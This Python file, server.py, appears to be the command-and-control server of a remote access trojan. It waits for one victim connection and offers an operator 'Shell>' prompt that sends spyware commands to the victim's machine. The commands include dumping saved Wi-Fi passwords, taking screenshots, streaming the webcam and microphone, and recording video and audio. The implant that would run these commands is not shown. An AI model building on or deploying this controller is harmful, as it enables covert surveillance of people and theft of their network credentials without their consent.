# server.py

import socket
import threading

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65432        # Port to listen on (non-privileged ports are > 1023)

valid_commands = ("help","get_wifi_profiles", "get_wifi_password_all","screanshort", "stream_camera", "stream_mic", "capture_video", "capture_audio", "get_wifi_passwords")

def server_listener():
    """
    Starts the server listener to accept client connections.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[*] Server is listening on {HOST}:{PORT}")
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connected to {client_address[0]}:{client_address[1]}")
    return server_socket, client_socket, client_address

def handle_client(client_socket, client_address):
    """
    Handles the client connection and processes commands.

    Args:
        client_socket: The socket object for the client.
        client_address: A tuple containing the client's IP and port.
    """
    try:
        while True:
            command = input("Shell> ").strip().lower()
            if command in ("exit", "quit"):
                print("You are about to terminate this active connection.")
                confirmation = input("Do you really want to terminate the connection (yes/no) [default: no]? ").strip().lower()
                if confirmation == "yes":
                    client_socket.sendall(b"exit")
                    print(f"[*] Terminated the connection to {client_address[0]}:{client_address[1]}")
                    break
                elif confirmation == "no" or confirmation == "":
                    continue
            elif command in valid_commands:
                print(f"Executing command: {command}")
                client_socket.sendall(command.encode())  # Example of sending the command to the client
                response = client_socket.recv(1024).decode()
                print(response)
            else:
                print(f"Invalid command: {command}. Use 'help' to see available commands.")
    finally:
        client_socket.close()


def main():
    """
    The main entry point for the server application.
    """
    server_socket, client_socket, client_address = server_listener()
    handle_client(client_socket, client_address)

if __name__ == "__main__":
    main()
